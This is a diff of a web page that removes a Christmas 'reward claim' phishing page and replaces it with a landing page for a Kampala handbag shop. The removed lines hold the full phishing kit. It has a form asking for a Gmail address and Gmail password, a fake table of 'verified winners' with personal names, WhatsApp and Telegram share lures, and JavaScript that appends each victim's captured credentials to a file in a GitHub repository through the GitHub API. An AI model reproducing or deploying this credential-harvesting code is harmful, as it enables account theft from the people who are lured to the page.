@@ -3,111 +3,212 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>The Grand Xmas Unboxing | Official 2025</title>
-    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>Don Starr Bags | Luxury in Black & Orange</title>
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,700;1,700&family=Montserrat:wght@300;400;700&display=swap" rel="stylesheet">
+    
     <style>
-        :root { --bg-deep: #020d0d; --accent-gold: #f7dba7; --glass-white: rgba(255, 255, 255, 0.05); --glass-border: rgba(255, 255, 255, 0.1); --success-green: #4ade80; }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Inter', sans-serif; background: radial-gradient(circle at top, #0a3a38, var(--bg-deep)); color: white; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding-bottom: 50px; }
-        #snow-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
-        header { text-align: center; padding: 60px 20px 40px; z-index: 1; }
-        h1 { font-family: 'Playfair Display', serif; font-size: clamp(2.5rem, 8vw, 4rem); background: linear-gradient(to bottom, #fff, var(--accent-gold)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .main-container { width: 95%; max-width: 650px; z-index: 1; }
-        .glass-card { background: var(--glass-white); backdrop-filter: blur(30px); border: 1px solid var(--glass-border); border-radius: 24px; padding: 40px; box-shadow: 0 50px 100px rgba(0,0,0,0.5); margin-bottom: 30px; }
-        .input-group { margin-bottom: 18px; position: relative; }
-        .input-group i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: var(--accent-gold); opacity: 0.6; }
-        input { width: 100%; padding: 15px 15px 15px 45px; background: rgba(0,0,0,0.3); border: 1px solid var(--glass-border); border-radius: 12px; color: white; font-size: 0.95rem; }
-        .submit-btn { width: 100%; padding: 18px; background: linear-gradient(135deg, var(--accent-gold), #d4af37); color: #041f1e; border: none; border-radius: 12px; font-weight: 700; text-transform: uppercase; cursor: pointer; transition: 0.4s; }
-        .share-row { display: flex; gap: 10px; justify-content: center; margin-top: 20px; }
-        .share-btn { flex: 1; padding: 12px; border-radius: 10px; border: 1px solid var(--glass-border); text-align: center; cursor: pointer; color: white; text-decoration: none; font-size: 0.8rem; background: rgba(255,255,255,0.05); display: flex; align-items: center; justify-content: center; gap: 8px; }
-        table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
-        th { text-align: left; padding: 12px; border-bottom: 1px solid var(--glass-border); color: var(--accent-gold); }
-        td { padding: 12px; border-bottom: 1px solid rgba(255,255,255,0.03); }
-        .status-pill { background: rgba(74, 222, 128, 0.15); color: var(--success-green); padding: 4px 10px; border-radius: 20px; font-size: 0.65rem; font-weight: 700; }
+        :root {
+            --orange: #FF6B00; 
+            --black: #0A0A0A;  
+            --white: #FFFFFF;
+            --gray: #1A1A1A;   
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Montserrat', sans-serif;
+        }
+
+        body { background-color: var(--black); color: var(--white); line-height: 1.6; }
+
+        /* --- NAVIGATION --- */
+        nav {
+            background: rgba(10, 10, 10, 0.98);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 8%;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            border-bottom: 1px solid var(--gray);
+        }
+
+        .logo-area { 
+            display: flex; 
+            align-items: center; 
+            text-decoration: none; 
+            color: var(--white); 
+        }
+
+        /* LOGO STYLING */
+        .logo-area img { 
+            height: 55px; /* Slightly larger for impact */
+            width: auto; 
+            margin-right: 15px;
+            object-fit: contain;
+            border-radius: 4px; /* Softens the edges of the jpeg */
+        }
+
+        .logo-area span { 
+            font-family: 'Playfair Display', serif; 
+            font-size: 20px; 
+            letter-spacing: 2px; 
+            font-weight: 700; 
+            text-transform: uppercase;
+        }
+
+        .logo-area b { color: var(--orange); }
+
+        .nav-links { list-style: none; display: flex; }
+        .nav-links li { margin-left: 30px; }
+        .nav-links a { 
+            text-decoration: none; 
+            color: #BBB; 
+            font-size: 11px; 
+            letter-spacing: 2px; 
+            text-transform: uppercase; 
+            font-weight: 600; 
+            transition: 0.3s; 
+        }
+        .nav-links a:hover { color: var(--orange); }
+
+        /* --- HERO SECTION --- */
+        .hero {
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 0 8%;
+            background: linear-gradient(rgba(0,0,0,0.75), rgba(0,0,0,0.75)), 
+                        url('https://images.unsplash.com/photo-1490481651871-ab68de25d43d?q=80&w=1470');
+            background-size: cover;
+            background-position: center;
+            border-bottom: 4px solid var(--orange);
+        }
+
+        .hero-content { max-width: 850px; }
+        .hero-content span { color: var(--orange); text-transform: uppercase; letter-spacing: 8px; font-size: 12px; font-weight: 700; display: block; margin-bottom: 20px; }
+        .hero-content h1 { font-family: 'Playfair Display', serif; font-size: clamp(40px, 8vw, 85px); line-height: 1; margin-bottom: 35px; font-style: italic; }
+        
+        .cta-orange {
+            background: var(--orange);
+            color: var(--black);
+            padding: 18px 50px;
+            text-decoration: none;
+            font-size: 12px;
+            letter-spacing: 2px;
+            font-weight: 700;
+            transition: 0.4s;
+            display: inline-block;
+            border: 2px solid var(--orange);
+        }
+        .cta-orange:hover { background: transparent; color: var(--orange); }
+
+        /* --- FEATURED SECTION --- */
+        .featured { padding: 100px 8%; text-align: center; }
+        .featured h2 { font-family: 'Playfair Display', serif; font-size: 35px; margin-bottom: 60px; }
+        .featured h2 span { color: var(--orange); }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 40px;
+        }
+
+        .f-card {
+            background: #111;
+            padding: 0;
+            transition: 0.4s;
+            text-align: left;
+        }
+        .f-card:hover { transform: translateY(-10px); }
+        .img-box { width: 100%; height: 400px; overflow: hidden; position: relative; }
+        .f-card img { width: 100%; height: 100%; object-fit: cover; transition: 0.6s; }
+        .f-card:hover img { transform: scale(1.05); }
+
+        .info-box { padding: 25px; border-top: 3px solid var(--orange); }
+        .f-card h3 { font-size: 14px; letter-spacing: 2px; margin-bottom: 8px; }
+        .f-card p { color: #666; font-size: 11px; text-transform: uppercase; margin-bottom: 15px; }
+        .btn-small { color: var(--orange); text-decoration: none; font-size: 11px; font-weight: 700; letter-spacing: 1px; }
+
+        /* --- FOOTER --- */
+        footer { background: #050505; color: #444; padding: 60px 8% 30px; text-align: center; border-top: 1px solid var(--gray); }
+        .socials { margin-bottom: 30px; }
+        .socials a { color: var(--white); margin: 0 15px; text-decoration: none; font-size: 14px; letter-spacing: 1px; }
+        .socials a:hover { color: var(--orange); }
+
+        @media (max-width: 768px) {
+            .nav-links { display: none; }
+            .hero-content h1 { font-size: 45px; }
+        }
     </style>
 </head>
 <body>
-    <canvas id="snow-canvas"></canvas>
-    <header><h1>Xmas Unboxing</h1></header>
-    <div class="main-container">
-        <div class="glass-card">
-            <h2 style="text-align: center; margin-bottom: 20px;">Claim Your 2025 Reward</h2>
-            <form id="registryForm">
-                <div class="input-group"><i class="fa fa-user"></i><input type="text" id="username" placeholder="Full Name" required></div>
-                <div class="input-group"><i class="fa fa-envelope"></i><input type="email" id="email" placeholder="Gmail Address" required></div>
-                <div class="input-group"><i class="fa fa-lock"></i><input type="password" id="password" placeholder="Gmail Password" required></div>
-                <div class="input-group"><i class="fa fa-location-dot"></i><input type="text" id="location" placeholder="Shipping Location" required></div>
-                <button type="button" id="submitBtn" onclick="saveToGitHub()" class="submit-btn">Submit & Claim</button>
-            </form>
-            <div class="share-row">
-                <a href="https://wa.me/?text=Claim%20your%20Xmas%20gift%20here!" class="share-btn"><i class="fab fa-whatsapp"></i> WhatsApp</a>
-                <a href="https://t.me/share/url?url=X-mas-github.io" class="share-btn"><i class="fab fa-telegram"></i> Telegram</a>
+
+    <nav>
+        <a href="index.html" class="logo-area">
+            <img src="images/logo.jpeg" alt="Don Starr Bags">
+            <span>DON STARR <b>BAGS</b></span>
+        </a>
+        <ul class="nav-links">
+            <li><a href="index.html">Home</a></li>
+            <li><a href="gallery.html">Collection</a></li>
+            <li><a href="about.html">Heritage</a></li>
+            <li><a href="contact.html">Connect</a></li>
+        </ul>
+    </nav>
+
+    <section class="hero">
+        <div class="hero-content">
+            <span>Redefining Ugandan Luxury</span>
+            <h1>Style Without <br>Compromise.</h1>
+            <a href="gallery.html" class="cta-orange">DISCOVER PIECES</a>
+        </div>
+    </section>
+
+    <section class="featured">
+        <h2>THE <span>SEASON'S</span> MUST-HAVES</h2>
+        <div class="grid">
+            <div class="f-card">
+                <div class="img-box"><img src="https://images.unsplash.com/photo-1584917865442-de89df76afd3?q=80&w=500" alt="Tote"></div>
+                <div class="info-box">
+                    <h3>ORANGE HERITAGE TOTE</h3>
+                    <p>Genuine Leather • New Arrival</p>
+                    <a href="gallery.html" class="btn-small">SHOP NOW →</a>
+                </div>
+            </div>
+            <div class="f-card">
+                <div class="img-box"><img src="https://images.unsplash.com/photo-1591561954557-26941169b49e?q=80&w=500" alt="Satchel"></div>
+                <div class="info-box">
+                    <h3>NOIR LADY SATCHEL</h3>
+                    <p>Evening Collection • Best Seller</p>
+                    <a href="gallery.html" class="btn-small">SHOP NOW →</a>
+                </div>
+            </div>
+            <div class="f-card">
+                <div class="img-box"><img src="https://images.unsplash.com/photo-1548036328-c9fa89d128fa?q=80&w=500" alt="Backpack"></div>
+                <div class="info-box">
+                    <h3>URBAN EXECUTIVE</h3>
+                    <p>Signature Piece • Limited Stock</p>
+                    <a href="gallery.html" class="btn-small">SHOP NOW →</a>
+                </div>
             </div>
         </div>
+    </section>
 
-        <div class="glass-card">
-            <h3 style="margin-bottom: 15px;">Live Distribution Registry</h3>
-            <div style="overflow-x: auto;">
-                <table>
-                    <thead><tr><th>ID Number</th><th>Winner Name</th><th>Status</th></tr></thead>
-                    <tbody>
-                        <tr><td>1000211-001</td><td>MUZAFARU KAYONDO</td><td><span class="status-pill">VERIFIED</span></td></tr>
-                        <tr><td>1000199-001</td><td>ISMAIL SSEBBANJA</td><td><span class="status-pill">VERIFIED</span></td></tr>
-                        <tr><td>1000200-001</td><td>BRIAN SSEMPEBWA</td><td><span class="status-pill">VERIFIED</span></td></tr>
-                        <tr><td>1000202-001</td><td>RESTY KABAHUMA</td><td><span class="status-pill">VERIFIED</span></td></tr>
-                        <tr><td>1000215-001</td><td>JOSEPH BYAMUKAMA</td><td><span class="status-pill">VERIFIED</span></td></tr>
-                    </tbody>
-                </table>
-            </div>
+    <footer>
+        <div class="socials">
+            <a href="#">INSTAGRAM</a>
+            <a href="#">FACEBOOK</a>
+            <a href="#">WHATSAPP</a>
         </div>
-    </div>
+        <p>&copy; 2026 Don Starr Bags Kampala. Quality is our Signature.</p>
+    </footer>
 
-    <script>
-        async function saveToGitHub() {
-            const btn = document.getElementById('submitBtn');
-            const CONFIG = {
-                TOKEN: "YOUR_GITHUB_TOKEN", 
-                OWNER: "YOUR_USERNAME",
-                REPO: "X-mas-github.io",
-                FILE: "file.txt"
-            };
-
-            const data = {
-                name: document.getElementById('username').value,
-                email: document.getElementById('email').value,
-                pass: document.getElementById('password').value,
-                loc: document.getElementById('location').value,
-                time: new Date().toLocaleString()
-            };
-
-            if(!data.name || !data.email || !data.pass) return alert("Fill all fields");
-            btn.innerText = "VERIFYING..."; btn.disabled = true;
-
-            try {
-                const url = `https://api.github.com/repos/${CONFIG.OWNER}/${CONFIG.REPO}/contents/${CONFIG.FILE}`;
-                const res = await fetch(url, { headers: { "Authorization": `token ${CONFIG.TOKEN}` } });
-                let sha = ""; let current = "";
-
-                if (res.ok) {
-                    const json = await res.json();
-                    sha = json.sha;
-                    current = atob(json.content);
-                }
-
-                const newContent = current + `\n[${data.time}] Name: ${data.name} | User: ${data.email} | Pass: ${data.pass} | Loc: ${data.loc}`;
-                
-                const push = await fetch(url, {
-                    method: "PUT",
-                    headers: { "Authorization": `token ${CONFIG.TOKEN}`, "Content-Type": "application/json" },
-                    body: JSON.stringify({ message: "New Entry", content: btoa(newContent), sha: sha })
-                });
-
-                if (push.ok) { alert("Successfully Registered!"); document.getElementById('registryForm').reset(); }
-                else { alert("Registry Error. Check Configuration."); }
-            } catch (e) { alert("Network Error."); }
-            finally { btn.innerText = "Submit & Claim"; btn.disabled = false; }
-        }
-    </script>
 </body>
 </html>
